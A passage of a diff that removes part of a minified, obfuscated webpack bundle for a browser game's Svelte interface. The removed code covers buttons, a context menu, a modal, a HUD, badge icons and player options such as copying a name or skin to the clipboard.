@@ -1,8564 +1,8568 @@
-(() => {
-    var $, e, t, x = {
-            31091($, e, t) {
-                t.p
-            },
-            49544($, e, t) {
-                t.p
-            },
-            63166($, e, t) {
-                t.p
-            },
-            4391($, e, t) {
-                t.p
-            },
-            10103($, e, t) {
-                t.d(e, {
-                    A: () => x
-                });
-                let x = t.p + "img/intro-icon.png"
-            },
-            57088($, e, t) {
-                t.p
-            },
-            15481($, e, t) {
-                t.d(e, {
-                    A: () => i
-                });
-                var x = t(83839);
-                t(60821);
-                class s extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, s) {
-                            let i = [],
-                                n = (0, x.URP)(t, i),
-                                {
-                                    $$slots: a = {},
-                                    $$scope: o
-                                } = t;
-                            return e.$$set = $ => {
-                                t = (0, x.kpz)((0, x.kpz)({}, t), (0, x.Qe9)($)), s(0, n = (0, x.URP)(t, i)), "$$scope" in $ && s(1, o = $.$$scope)
-                            }, [n, o, a, function($) {
-                                x.Tq.call(this, e, $)
-                            }]
-                        }, function $(e) {
-                            let t, s, i, n, a = e[2].default,
-                                o = (0, x.Of3)(a, e, e[1], null),
-                                r = [{
-                                    class: "button"
-                                }, e[0]],
-                                l = {};
-                            for (let c = 0; c < r.length; c += 1) l = (0, x.kpz)(l, r[c]);
-                            return {
-                                c() {
-                                    t = (0, x.ND4)("button"), o && o.c(), (0, x.vhI)(t, l), (0, x.goL)(t, "s-cv3b48", !0)
-                                },
-                                m($, a) {
-                                    (0, x.Yry)($, t, a), o && o.m(t, null), t.autofocus && t.focus(), s = !0, i || (n = (0, x.KTR)(t, "click", e[3]), i = !0)
-                                },
-                                p($, [e]) {
-                                    o && o.p && (!s || 2 & e) && (0, x.nkG)(o, a, $, $[1], s ? (0, x.sWk)(a, $[1], e, null) : (0, x.i32)($[1]), null), (0, x.vhI)(t, l = (0, x.HN9)(r, [{
-                                        class: "button"
-                                    }, 1 & e && $[0]])), (0, x.goL)(t, "s-cv3b48", !0)
-                                },
-                                i($) {
-                                    s || ((0, x.c7F)(o, $), s = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(o, $), s = !1
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), o && o.d($), i = !1, n()
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let i = s
-            },
-            19680($, e, t) {
-                t.d(e, {
-                    A: () => o
-                });
-                var x = t(83839),
-                    s = (t(60821), t(74173)),
-                    i = t(95669);
-
-                function n($) {
-                    let e, t, s, n = $[5].default,
-                        a = (0, x.Of3)(n, $, $[4], null);
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), a && a.c(), (0, x.hgi)(e, "top", $[1].y + "px"), (0, x.hgi)(e, "left", $[1].x + "px"), (0, x.CFu)(e, "class", "context-menu s-1mp7axm")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t), a && a.m(e, null), s = !0
-                        },
-                        p($, t) {
-                            a && a.p && (!s || 16 & t) && (0, x.nkG)(a, n, $, $[4], s ? (0, x.sWk)(n, $[4], t, null) : (0, x.i32)($[4]), null), (!s || 2 & t) && (0, x.hgi)(e, "top", $[1].y + "px"), (!s || 2 & t) && (0, x.hgi)(e, "left", $[1].x + "px")
-                        },
-                        i($) {
-                            s || ((0, x.c7F)(a, $), $ && (0, x.Dti)(() => {
-                                s && (t = t || (0, x.h86)(e, i.Rv, {
-                                    duration: 200
-                                }, !0)).run(1)
-                            }), s = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(a, $), $ && (t = t || (0, x.h86)(e, i.Rv, {
-                                duration: 200
-                            }, !1)).run(0), s = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), a && a.d($), $ && t && t.end()
-                        }
-                    }
-                }
-                class a extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, x) {
-                            let {
-                                $$slots: i = {},
-                                $$scope: n
-                            } = t, {
-                                show: a = !1
-                            } = t, o = s.A.from();
-                            return e.$$set = $ => {
-                                "show" in $ && x(0, a = $.show), "$$scope" in $ && x(4, n = $.$$scope)
-                            }, [a, o, $ => {
-                                o.set($.clientX, $.clientY)
-                            }, () => {
-                                a && x(1, o)
-                            }, n, i]
-                        }, function $(e) {
-                            let t, s, i, a, o = e[0] && n(e);
-                            return {
-                                c() {
-                                    o && o.c(), t = (0, x.Iex)()
-                                },
-                                m($, n) {
-                                    o && o.m($, n), (0, x.Yry)($, t, n), s = !0, i || (a = (0, x.KTR)(window, "mousemove", e[2]), i = !0)
-                                },
-                                p($, [e]) {
-                                    $[0] ? o ? (o.p($, e), 1 & e && (0, x.c7F)(o, 1)) : ((o = n($)).c(), (0, x.c7F)(o, 1), o.m(t.parentNode, t)) : o && ((0, x.V44)(), (0, x.Tn8)(o, 1, 1, () => {
-                                        o = null
-                                    }), (0, x.GYV)())
-                                },
-                                i($) {
-                                    s || ((0, x.c7F)(o), s = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(o), s = !1
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), o && o.d($), i = !1, a()
-                                }
-                            }
-                        }, x.jXN, {
-                            show: 0,
-                            update: 3
-                        })
-                    }
-                    get update() {
-                        return this.$$.ctx[3]
-                    }
-                }
-                let o = a
-            },
-            98781($, e, t) {
-                t.d(e, {
-                    A: () => o
-                });
-                var x = t(83839),
-                    s = (t(60821), t(41949)),
-                    i = t(95669);
-
-                function n($) {
-                    let e, t, s, n, a, o, r, l, c, h = $[4].default,
-                        A = (0, x.Of3)(h, $, $[3], null),
-                        u = [{
-                            class: "modal container"
-                        }, $[2]],
-                        d = {};
-                    for (let g = 0; g < u.length; g += 1) d = (0, x.kpz)(d, u[g]);
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("div"), s = (0, x.xem)(), n = (0, x.ND4)("div"), a = (0, x.ND4)("div"), A && A.c(), (0, x.CFu)(t, "class", "background s-1rrv5lu"), (0, x.CFu)(a, "class", "content s-1rrv5lu"), (0, x.vhI)(n, d), (0, x.goL)(n, "s-1rrv5lu", !0)
-                        },
-                        m(i, o) {
-                            (0, x.Yry)(i, e, o), (0, x.BCw)(e, t), (0, x.BCw)(e, s), (0, x.BCw)(e, n), (0, x.BCw)(n, a), A && A.m(a, null), r = !0, l || (c = (0, x.KTR)(t, "click", $[5]), l = !0)
-                        },
-                        p($, e) {
-                            A && A.p && (!r || 8 & e) && (0, x.nkG)(A, h, $, $[3], r ? (0, x.sWk)(h, $[3], e, null) : (0, x.i32)($[3]), null), (0, x.vhI)(n, d = (0, x.HN9)(u, [{
-                                class: "modal container"
-                            }, 4 & e && $[2]])), (0, x.goL)(n, "s-1rrv5lu", !0)
-                        },
-                        i($) {
-                            r || ((0, x.c7F)(A, $), $ && (0, x.Dti)(() => {
-                                r && (o = o || (0, x.h86)(e, i.Rv, {
-                                    duration: 200
-                                }, !0)).run(1)
-                            }), r = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(A, $), $ && (o = o || (0, x.h86)(e, i.Rv, {
-                                duration: 200
-                            }, !1)).run(0), r = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), A && A.d($), $ && o && o.end(), l = !1, c()
-                        }
-                    }
-                }
-                class a extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, i) {
-                            let n = ["show"],
-                                a = (0, x.URP)(t, n),
-                                {
-                                    $$slots: o = {},
-                                    $$scope: r
-                                } = t,
-                                l = (0, s.ur)(),
-                                {
-                                    show: c = !1
-                                } = t,
-                                h = $ => {
-                                    i(0, c = $), l("visibility", $)
-                                };
-                            return e.$$set = $ => {
-                                t = (0, x.kpz)((0, x.kpz)({}, t), (0, x.Qe9)($)), i(2, a = (0, x.URP)(t, n)), "show" in $ && i(0, c = $.show), "$$scope" in $ && i(3, r = $.$$scope)
-                            }, [c, h, a, r, o, () => h(!1)]
-                        }, function $(e) {
-                            let t, s, i = e[0] && n(e);
-                            return {
-                                c() {
-                                    i && i.c(), t = (0, x.Iex)()
-                                },
-                                m($, e) {
-                                    i && i.m($, e), (0, x.Yry)($, t, e), s = !0
-                                },
-                                p($, [e]) {
-                                    $[0] ? i ? (i.p($, e), 1 & e && (0, x.c7F)(i, 1)) : ((i = n($)).c(), (0, x.c7F)(i, 1), i.m(t.parentNode, t)) : i && ((0, x.V44)(), (0, x.Tn8)(i, 1, 1, () => {
-                                        i = null
-                                    }), (0, x.GYV)())
-                                },
-                                i($) {
-                                    s || ((0, x.c7F)(i), s = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(i), s = !1
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), i && i.d($)
-                                }
-                            }
-                        }, x.jXN, {
-                            show: 0
-                        })
-                    }
-                }
-                let o = a
-            },
-            6716($, e, t) {
-                t.d(e, {
-                    A: () => f
-                });
-                var x = t(83839),
-                    s = (t(60821), t(98837)),
-                    i = t(79305),
-                    n = t(92008),
-                    a = t(98685),
-                    o = t(87399),
-                    r = t(14389),
-                    l = t(33203),
-                    c = t(58650),
-                    h = t(64127),
-                    A = t(95669),
-                    u = (t(4391), t(95195)),
-                    d = t(28858);
-
-                function g($) {
-                    let e, t;
-                    return e = new c.A({}), {
-                        c() {
-                            (0, x.N0i)(e.$$.fragment)
-                        },
-                        m($, s) {
-                            (0, x.wSR)(e, $, s), t = !0
-                        },
-                        p: x.lQ1,
-                        i($) {
-                            t || ((0, x.c7F)(e.$$.fragment, $), t = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(e.$$.fragment, $), t = !1
-                        },
-                        d($) {
-                            (0, x.Hbl)(e, $)
-                        }
-                    }
-                }
-
-                function m($) {
-                    let e, t, c, h, A, u, d, g, m, p, f, _, w, v, b, y, B, F, I = (t = new s.A({}), h = new i.A({}), u = new n.A({}), g = new a.A({}), p = new r.A({}), _ = new l.A({}), $[1] && C($));
-                    return b = new o.A({}), {
-                        c() {
-                            e = (0, x.ND4)("div"), (0, x.N0i)(t.$$.fragment), c = (0, x.xem)(), (0, x.N0i)(h.$$.fragment), A = (0, x.xem)(), (0, x.N0i)(u.$$.fragment), d = (0, x.xem)(), (0, x.N0i)(g.$$.fragment), m = (0, x.xem)(), (0, x.N0i)(p.$$.fragment), f = (0, x.xem)(), (0, x.N0i)(_.$$.fragment), w = (0, x.xem)(), I && I.c(), v = (0, x.xem)(), (0, x.N0i)(b.$$.fragment), y = (0, x.xem)(), B = (0, x.ND4)("div"), (0, x.CFu)(e, "class", "hud s-xuc99v"), (0, x.CFu)(B, "class", "captcha-container center")
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.wSR)(t, e, null), (0, x.BCw)(e, c), (0, x.wSR)(h, e, null), (0, x.BCw)(e, A), (0, x.wSR)(u, e, null), (0, x.BCw)(e, d), (0, x.wSR)(g, e, null), (0, x.Yry)($, m, s), (0, x.wSR)(p, $, s), (0, x.Yry)($, f, s), (0, x.wSR)(_, $, s), (0, x.Yry)($, w, s), I && I.m($, s), (0, x.Yry)($, v, s), (0, x.wSR)(b, $, s), (0, x.Yry)($, y, s), (0, x.Yry)($, B, s), F = !0
-                        },
-                        p($, e) {
-                            $[1] ? I ? (I.p($, e), 2 & e && (0, x.c7F)(I, 1)) : ((I = C($)).c(), (0, x.c7F)(I, 1), I.m(v.parentNode, v)) : I && ((0, x.V44)(), (0, x.Tn8)(I, 1, 1, () => {
-                                I = null
-                            }), (0, x.GYV)())
-                        },
-                        i($) {
-                            F || ((0, x.c7F)(t.$$.fragment, $), (0, x.c7F)(h.$$.fragment, $), (0, x.c7F)(u.$$.fragment, $), (0, x.c7F)(g.$$.fragment, $), (0, x.c7F)(p.$$.fragment, $), (0, x.c7F)(_.$$.fragment, $), (0, x.c7F)(I), (0, x.c7F)(b.$$.fragment, $), F = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(t.$$.fragment, $), (0, x.Tn8)(h.$$.fragment, $), (0, x.Tn8)(u.$$.fragment, $), (0, x.Tn8)(g.$$.fragment, $), (0, x.Tn8)(p.$$.fragment, $), (0, x.Tn8)(_.$$.fragment, $), (0, x.Tn8)(I), (0, x.Tn8)(b.$$.fragment, $), F = !1
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(m), (0, x.YoD)(f), (0, x.YoD)(w), (0, x.YoD)(v), (0, x.YoD)(y), (0, x.YoD)(B)), (0, x.Hbl)(t), (0, x.Hbl)(h), (0, x.Hbl)(u), (0, x.Hbl)(g), (0, x.Hbl)(p, $), (0, x.Hbl)(_, $), I && I.d($), (0, x.Hbl)(b, $)
-                        }
-                    }
-                }
-
-                function C($) {
-                    let e, t, s, i, n, a, o, r;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("button"), s = (0, x.ND4)("i"), (0, x.CFu)(s, "class", "fal fa-times"), (0, x.CFu)(t, "class", "exit-button s-xuc99v"), t.disabled = i = !$[0], (0, x.CFu)(e, "class", "overlay")
-                        },
-                        m(i, n) {
-                            (0, x.Yry)(i, e, n), (0, x.BCw)(e, t), (0, x.BCw)(t, s), a = !0, o || (r = [(0, x.KTR)(t, "click", $[3]), (0, x.KTR)(e, "click", $[4])], o = !0)
-                        },
-                        p($, e) {
-                            (!a || 1 & e && i !== (i = !$[0])) && (t.disabled = i)
-                        },
-                        i($) {
-                            a || ($ && (0, x.Dti)(() => {
-                                a && (n = n || (0, x.h86)(e, A.Rv, {
-                                    duration: 200
-                                }, !0)).run(1)
-                            }), a = !0)
-                        },
-                        o($) {
-                            $ && (n = n || (0, x.h86)(e, A.Rv, {
-                                duration: 200
-                            }, !1)).run(0), a = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), $ && n && n.end(), (o = !1, x.oOW)(r)
-                        }
-                    }
-                }
-                class p extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, s) {
-                            let i, n;
-                            (0, x.j0C)(e, h.z, $ => s(1, i = $)), (0, x.j0C)(e, d.S, $ => s(2, n = $)), u.A.on("Dcxyoc", $ => {
-                                (0, x.vu6)(h.z, i = $, i)
-                            });
-                            let a;
-                            return u.A.on("started", () => s(0, a = !0)), u.A.on("stopped", () => s(0, a = !1)), [a, i, n, () => {
-                                a && (u.A.eWI.forEach($ => $.close()), u.A.stop())
-                            }, () => {
-                                a && u.A.FQe(!1)
-                            }]
-                        }, function $(e) {
-                            let t, s, i, n, a = [m, g],
-                                o = [];
-
-                            function r($) {
-                                return $[2] ? 0 : 1
-                            }
-                            return i = o[s = r(e)] = a[s](e), {
-                                c() {
-                                    t = (0, x.ND4)("div"), i.c(), (0, x.CFu)(t, "class", "app")
-                                },
-                                m($, e) {
-                                    (0, x.Yry)($, t, e), o[s].m(t, null), n = !0
-                                },
-                                p($, [e]) {
-                                    let n = s;
-                                    (s = r($)) === n ? o[s].p($, e) : ((0, x.V44)(), (0, x.Tn8)(o[n], 1, 1, () => {
-                                        o[n] = null
-                                    }), (0, x.GYV)(), (i = o[s]) ? i.p($, e) : (i = o[s] = a[s]($)).c(), (0, x.c7F)(i, 1), i.m(t, null))
-                                },
-                                i($) {
-                                    n || ((0, x.c7F)(i), n = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(i), n = !1
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), o[s].d()
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let f = p
-            },
-            3854($, e, t) {
-                t.d(e, {
-                    A: () => n
-                });
-                var x = t(83839),
-                    s = (t(60821), t(54659));
-                class i extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, i) {
-                            let n = ["used", "owned", "height"],
-                                a = (0, x.URP)(t, n),
-                                {
-                                    used: o = 0
-                                } = t,
-                                {
-                                    owned: r = 0
-                                } = t,
-                                {
-                                    height: l = 22
-                                } = t;
-                            var c = s.R.find($ => !!(o & $[0])),
-                                c = {
-                                    index: c[0],
-                                    path: c[1],
-                                    text: c[2],
-                                    selected: !!(o & c[0]),
-                                    owned: !!(r & c[0])
-                                };
-                            return e.$$set = $ => {
-                                t = (0, x.kpz)((0, x.kpz)({}, t), (0, x.Qe9)($)), i(3, a = (0, x.URP)(t, n)), "used" in $ && i(4, o = $.used), "owned" in $ && i(0, r = $.owned), "height" in $ && i(1, l = $.height)
-                            }, [r, l, c, a, o]
-                        }, function $(e) {
-                            let t, s, i, n, a = [{
-                                    class: "badge"
-                                }, e[3]],
-                                o = {};
-                            for (let r = 0; r < a.length; r += 1) o = (0, x.kpz)(o, a[r]);
-                            return {
-                                c() {
-                                    t = (0, x.ND4)("div"), s = (0, x.ND4)("img"), (0, x.CFu)(s, "class", "badge-icon s-1c9puth"), (0, x.CFu)(s, "crossorigin", "anonymous"), (0, x.CFu)(s, "draggable", "false"), (0, x.mq_)(s.src, i = "./img/badges/" + e[2].path + ".png") || (0, x.CFu)(s, "src", i), (0, x.CFu)(s, "data-tip", n = e[2].text), (0, x.CFu)(s, "height", e[1]), (0, x.CFu)(s, "alt", "Perk badge"), (0, x.goL)(s, "dim", !e[2].selected), (0, x.goL)(s, "unpickable", !e[2].owned && e[0]), (0, x.goL)(s, "pickable", e[2].owned), (0, x.vhI)(t, o), (0, x.goL)(t, "s-1c9puth", !0)
-                                },
-                                m($, e) {
-                                    (0, x.Yry)($, t, e), (0, x.BCw)(t, s)
-                                },
-                                p($, [e]) {
-                                    2 & e && (0, x.CFu)(s, "height", $[1]), 5 & e && (0, x.goL)(s, "unpickable", !$[2].owned && $[0]), (0, x.vhI)(t, o = (0, x.HN9)(a, [{
-                                        class: "badge"
-                                    }, 8 & e && $[3]])), (0, x.goL)(t, "s-1c9puth", !0)
-                                },
-                                i: x.lQ1,
-                                o: x.lQ1,
-                                d($) {
-                                    $ && (0, x.YoD)(t)
-                                }
-                            }
-                        }, x.jXN, {
-                            used: 4,
-                            owned: 0,
-                            height: 1
-                        })
-                    }
-                }
-                let n = i
-            },
-            14389($, e, t) {
-                t.d(e, {
-                    A: () => p
-                });
-                var x = t(83839),
-                    s = (t(60821), t(95195)),
-                    i = t(95514),
-                    n = t(41958),
-                    a = t(15308),
-                    o = t(19680),
-                    r = t(15481);
-
-                function l($) {
-                    let e;
-                    return {
-                        c() {
-                            e = (0, x.Qq7)("Spectate")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function c($) {
-                    let e = $[2].cSM ? "Hide" : "Show",
-                        t, s;
-                    return {
-                        c() {
-                            t = (0, x.Qq7)(e), s = (0, x.Qq7)(" Name")
-                        },
-                        m($, e) {
-                            (0, x.Yry)($, t, e), (0, x.Yry)($, s, e)
-                        },
-                        p($, s) {
-                            4 & s && e !== (e = $[2].cSM ? "Hide" : "Show") && (0, x.iQh)(t, e)
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(t), (0, x.YoD)(s))
-                        }
-                    }
-                }
-
-                function h($) {
-                    let e;
-                    return {
-                        c() {
-                            e = (0, x.Qq7)("Copy Name")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function A($) {
-                    let e, t, s, i, n, a;
-                    return (e = new r.A({
-                        props: {
-                            $$slots: {
-                                default: [u]
-                            },
-                            $$scope: {
-                                ctx: $
-                            }
-                        }
-                    })).$on("click", $[5]), (s = new r.A({
-                        props: {
-                            $$slots: {
-                                default: [d]
-                            },
-                            $$scope: {
-                                ctx: $
-                            }
-                        }
-                    })).$on("click", $[7]), (n = new r.A({
-                        props: {
-                            $$slots: {
-                                default: [g]
-                            },
-                            $$scope: {
-                                ctx: $
-                            }
-                        }
-                    })).$on("click", $[8]), {
-                        c() {
-                            (0, x.N0i)(e.$$.fragment), t = (0, x.xem)(), (0, x.N0i)(s.$$.fragment), i = (0, x.xem)(), (0, x.N0i)(n.$$.fragment)
-                        },
-                        m($, o) {
-                            (0, x.wSR)(e, $, o), (0, x.Yry)($, t, o), (0, x.wSR)(s, $, o), (0, x.Yry)($, i, o), (0, x.wSR)(n, $, o), a = !0
-                        },
-                        p($, t) {
-                            var x = {},
-                                x = (4100 & t && (x.$$scope = {
-                                    dirty: t,
-                                    ctx: $
-                                }), e.$set(x), {}),
-                                x = (4096 & t && (x.$$scope = {
-                                    dirty: t,
-                                    ctx: $
-                                }), s.$set(x), {});
-                            4096 & t && (x.$$scope = {
-                                dirty: t,
-                                ctx: $
-                            }), n.$set(x)
-                        },
-                        i($) {
-                            a || ((0, x.c7F)(e.$$.fragment, $), (0, x.c7F)(s.$$.fragment, $), (0, x.c7F)(n.$$.fragment, $), a = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(e.$$.fragment, $), (0, x.Tn8)(s.$$.fragment, $), (0, x.Tn8)(n.$$.fragment, $), a = !1
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(t), (0, x.YoD)(i)), (0, x.Hbl)(e, $), (0, x.Hbl)(s, $), (0, x.Hbl)(n, $)
-                        }
-                    }
-                }
-
-                function u($) {
-                    let e = $[2].urX ? "Hide" : "Show",
-                        t, s;
-                    return {
-                        c() {
-                            t = (0, x.Qq7)(e), s = (0, x.Qq7)(" Skin")
-                        },
-                        m($, e) {
-                            (0, x.Yry)($, t, e), (0, x.Yry)($, s, e)
-                        },
-                        p($, s) {
-                            4 & s && e !== (e = $[2].urX ? "Hide" : "Show") && (0, x.iQh)(t, e)
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(t), (0, x.YoD)(s))
-                        }
-                    }
-                }
-
-                function d($) {
-                    let e;
-                    return {
-                        c() {
-                            e = (0, x.Qq7)("Copy Skin")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function g($) {
-                    let e;
-                    return {
-                        c() {
-                            e = (0, x.Qq7)("Copy Info")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function m($) {
-                    var e;
-                    let t, i, a, o = $[2].name + "",
-                        u, d, g, m, C, p, f, _, w, v, b = !s.A.alive && (e = $, (t = new r.A({
-                            props: {
-                                $$slots: {
-                                    default: [l]
-                                },
-                                $$scope: {
-                                    ctx: e
-                                }
-                            }
-                        })).$on("click", e[3]), {
-                            c() {
-                                (0, x.N0i)(t.$$.fragment)
-                            },
-                            m($, e) {
-                                (0, x.wSR)(t, $, e), i = !0
-                            },
-                            p($, e) {
-                                var x = {};
-                                4096 & e && (x.$$scope = {
-                                    dirty: e,
-                                    ctx: $
-                                }), t.$set(x)
-                            },
-                            i($) {
-                                i || ((0, x.c7F)(t.$$.fragment, $), i = !0)
-                            },
-                            o($) {
-                                (0, x.Tn8)(t.$$.fragment, $), i = !1
-                            },
-                            d($) {
-                                (0, x.Hbl)(t, $)
-                            }
-                        }),
-                        y = ((C = new r.A({
-                            props: {
-                                $$slots: {
-                                    default: [c]
-                                },
-                                $$scope: {
-                                    ctx: $
-                                }
-                            }
-                        })).$on("click", $[4]), (f = new r.A({
-                            props: {
-                                $$slots: {
-                                    default: [h]
-                                },
-                                $$scope: {
-                                    ctx: $
-                                }
-                            }
-                        })).$on("click", $[6]), $[2] instanceof n.A && A($));
-                    return {
-                        c() {
-                            a = (0, x.ND4)("span"), u = (0, x.Qq7)(o), g = (0, x.xem)(), b && b.c(), m = (0, x.xem)(), (0, x.N0i)(C.$$.fragment), p = (0, x.xem)(), (0, x.N0i)(f.$$.fragment), _ = (0, x.xem)(), y && y.c(), w = (0, x.Iex)(), (0, x.CFu)(a, "class", "player-name s-e6gqjf"), (0, x.CFu)(a, "style", d = $[2] instanceof n.A && null != $[2].TIJ ? "font-weight:bold;color:" + $[2].TIJ : "")
-                        },
-                        m($, e) {
-                            (0, x.Yry)($, a, e), (0, x.BCw)(a, u), (0, x.Yry)($, g, e), b && b.m($, e), (0, x.Yry)($, m, e), (0, x.wSR)(C, $, e), (0, x.Yry)($, p, e), (0, x.wSR)(f, $, e), (0, x.Yry)($, _, e), y && y.m($, e), (0, x.Yry)($, w, e), v = !0
-                        },
-                        p($, e) {
-                            (!v || 4 & e) && o !== (o = $[2].name + "") && (0, x.iQh)(u, o), (!v || 4 & e && d !== (d = $[2] instanceof n.A && null != $[2].TIJ ? "font-weight:bold;color:" + $[2].TIJ : "")) && (0, x.CFu)(a, "style", d), s.A.alive || b.p($, e);
-                            var t = {},
-                                t = (4100 & e && (t.$$scope = {
-                                    dirty: e,
-                                    ctx: $
-                                }), C.$set(t), {});
-                            4096 & e && (t.$$scope = {
-                                dirty: e,
-                                ctx: $
-                            }), f.$set(t), $[2] instanceof n.A ? y ? (y.p($, e), 4 & e && (0, x.c7F)(y, 1)) : ((y = A($)).c(), (0, x.c7F)(y, 1), y.m(w.parentNode, w)) : y && ((0, x.V44)(), (0, x.Tn8)(y, 1, 1, () => {
-                                y = null
-                            }), (0, x.GYV)())
-                        },
-                        i($) {
-                            v || ((0, x.c7F)(b), (0, x.c7F)(C.$$.fragment, $), (0, x.c7F)(f.$$.fragment, $), (0, x.c7F)(y), v = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(b), (0, x.Tn8)(C.$$.fragment, $), (0, x.Tn8)(f.$$.fragment, $), (0, x.Tn8)(y), v = !1
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(a), (0, x.YoD)(g), (0, x.YoD)(m), (0, x.YoD)(p), (0, x.YoD)(_), (0, x.YoD)(w)), b && b.d($), (0, x.Hbl)(C, $), (0, x.Hbl)(f, $), y && y.d($)
-                        }
-                    }
-                }
-                class C extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, o) {
-                            let r;
-                            var l = i.Uk.view;
-                            let c = !1,
-                                h;
-                            return s.A.on("stopped", () => {
-                                o(2, h = null)
-                            }), s.A.on("WdtSom", async $ => {
-                                $?.pid ? (r && c && r.update(), o(2, h = $), o(1, c = !0)) : o(1, c = !1)
-                            }), l.addEventListener("click", () => {
-                                o(1, c = !1)
-                            }), [r, c, h, () => {
-                                null != h && s.A.kmM.Xiy(h.pid)
-                            }, () => {
-                                null != h && (o(2, h.vyo = !h.cSM, h), h.AaG())
-                            }, () => {
-                                null != h && h instanceof n.A && (o(2, h.GeA = !h.urX, h), h.AaG())
-                            }, () => {
-                                null != h && (navigator.clipboard.writeText(h.name), (0, a.me)("Copied name to clipboard", 0, 2e3))
-                            }, () => {
-                                null != h && (navigator.clipboard.writeText(h.skinUrl || ""), (0, a.me)("Copied skin to clipboard", 0, 2e3))
-                            }, () => {
-                                var $;
-                                null != h && h instanceof n.A && (($ = []).push("Name: " + (h.name ?? "Unnamed")), $.push("Tag ID: " + (h.tagId ?? "<global tag>")), $.push("Name Color: " + (h.TIJ ?? "#ffffff")), $.push("Skin URL: " + (h.skinUrl ?? "https://vanis.io/s/vanis1")), navigator.clipboard.writeText($.join("\r\n")), (0, a.me)("Copied information to clipboard", 0, 2e3))
-                            }, function($) {
-                                x.Dnk[$ ? "unshift" : "push"](() => {
-                                    o(0, r = $)
-                                })
-                            }, function($) {
-                                o(1, c = $)
-                            }]
-                        }, function $(e) {
-                            let t, s, i;
-
-                            function n($) {
-                                e[10]($)
-                            }
-                            var a = {
-                                $$slots: {
-                                    default: [m]
-                                },
-                                $$scope: {
-                                    ctx: e
-                                }
-                            };
-                            return void 0 !== e[1] && (a.show = e[1]), t = new o.A({
-                                props: a
-                            }), e[9](t), x.Dnk.push(() => (0, x.oIE)(t, "show", n)), {
-                                c() {
-                                    (0, x.N0i)(t.$$.fragment)
-                                },
-                                m($, e) {
-                                    (0, x.wSR)(t, $, e), i = !0
-                                },
-                                p($, [e]) {
-                                    var i = {};
-                                    4100 & e && (i.$$scope = {
-                                        dirty: e,
-                                        ctx: $
-                                    }), !s && 2 & e && (s = !0, i.show = $[1], (0, x.Jk$)(() => s = !1)), t.$set(i)
-                                },
-                                i($) {
-                                    i || ((0, x.c7F)(t.$$.fragment, $), i = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(t.$$.fragment, $), i = !1
-                                },
-                                d($) {
-                                    e[9](null), (0, x.Hbl)(t, $)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let p = C
-            },
-            92008($, e, t) {
-                t.d(e, {
-                    A: () => b
-                });
-                var x = t(83839),
-                    s = (t(60821), t(95195)),
-                    i = t(83529),
-                    n = t(95514),
-                    a = t(15308),
-                    o = t(54659),
-                    r = t(3854),
-                    l = t(95669),
-                    c = t(41949);
-
-                function h($, e, t) {
-                    return ($ = $.slice())[21] = e[t], $
-                }
-
-                function A($) {
-                    let e, t, s = 1 + $[21].ePG + "",
-                        i, n;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("span"), t = (0, x.Qq7)("[tab "), i = (0, x.Qq7)(s), n = (0, x.Qq7)("]"), (0, x.CFu)(e, "class", "message tabid s-619hc6")
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.BCw)(e, t), (0, x.BCw)(e, i), (0, x.BCw)(e, n)
-                        },
-                        p($, e) {
-                            8 & e && s !== (s = 1 + $[21].ePG + "") && (0, x.iQh)(i, s)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function u($) {
-                    let e, t, s = $[21].from + "",
-                        i, n, a, o, r, l, c, h, A = $[21].badges && g($);
-                    return {
-                        c() {
